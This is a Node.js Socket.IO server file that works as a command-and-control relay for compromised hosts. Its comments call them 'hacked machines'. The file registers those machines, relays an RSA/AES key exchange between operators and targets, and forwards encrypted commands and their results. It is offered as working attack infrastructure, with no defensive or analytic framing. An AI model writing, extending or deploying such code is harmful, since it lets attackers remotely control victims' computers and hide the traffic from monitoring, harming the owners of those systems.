require('dotenv').config()
const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);
const PORT = process.env.PORT || 3000;

app.use(express.static("public"));

// List of Sources
const socketList = [];

// Sources are the hacked machines
// Listeners are the clients
io.on('connection', function (socket) {
    let socketID = null;
    let socketRoom = null;
    function updatedSocketList() {
        io.emit("socketList", socketList);
    }

    socket.on("joinRoom", (role, name) => {
        if (!role || !name || name.includes("-")) {
            console.log("Failed Connection");
            return;
        }
        socketID = socket.id + "-" + name;
        if (role === "source") {
            socketRoom = role;
            console.log(`Socket ${socketID} joined as a source.`);
            socketList.push(socketID);
        } else if (role === "listener") {
            socketRoom = role;
            console.log(`Socket ${socketID} joined as a listener.`);
        } else {
            console.log("Improper Role");
            return;
        }
        updatedSocketList();
    });

    socket.on("disconnect", () => {
        console.log(`User disconnected: ${socketID}`);
        if (socketRoom != "source") {
            return;
        }
        let index = socketList.indexOf(socketID);
        if (index == -1) {
            console.log("Source doesn't exist, disconnect.");
            return;
        }
        socketList.splice(index, 1);
        updatedSocketList();
    });

    socket.on("connectToServer", (id) => {
        if (!id || id.length == 0) {
            return socket.emit("message", "Bad Args");
        }
        let serv = null;
        for (let i = 0; i < socketList.length; i++) {
            if (socketList[i] == id) {
                serv = socketList[i];
                break;
            }
        }
        if (serv == null) {
            return socket.emit("message", "Invalid ID");
        }
        console.log(`Attempt connection to ${serv}`);
        serv = serv.substring(0, serv.indexOf("-"));
        io.to(serv).emit("connectionRequest", socket.id);
    });

    socket.on("encryptedChallenge1", (id, challenge) => {
        if (!id || id.length == 0 || !challenge) {
            return socket.emit("message", "Bad Args");
        }
        io.to(id).emit("encryptedChallenge2", socket.id, challenge);
    });

    socket.on("decrypted1", (socketID, decrypted) => {
        if (!socketID || !decrypted) {
            return socket.emit("message", "Bad Args");
        }
        io.to(socketID).emit("decrypted2", socket.id, decrypted);
    });

    socket.on("symmetric1", (socketID, encryptedAES) => {
        if (!socketID || !encryptedAES) {
            return socket.emit("message", "Bad Args");
        }
        io.to(socketID).emit("symmetric2", socket.id, encryptedAES);
    });

    socket.on("command", (socketID, encrypted) => {
        if(!socketID || !encrypted) {
            return socket.emit("message", "Bad Args");
        }
        io.to(socketID).emit("command", socket.id, encrypted);
    });

    socket.on("result", (socketID, encrypted) => {
        if(!socketID || !encrypted) {
            return socket.emit("message", "Bad Args");
        }
        io.to(socketID).emit("result", socket.id, encrypted);
    });

    socket.on("rejectFromServer", (id, msg) => {
        io.to(id).emit("message", msg);
    });
});

server.listen(PORT, () => {
    console.log(`Listening on: http://localhost:${PORT}`);
});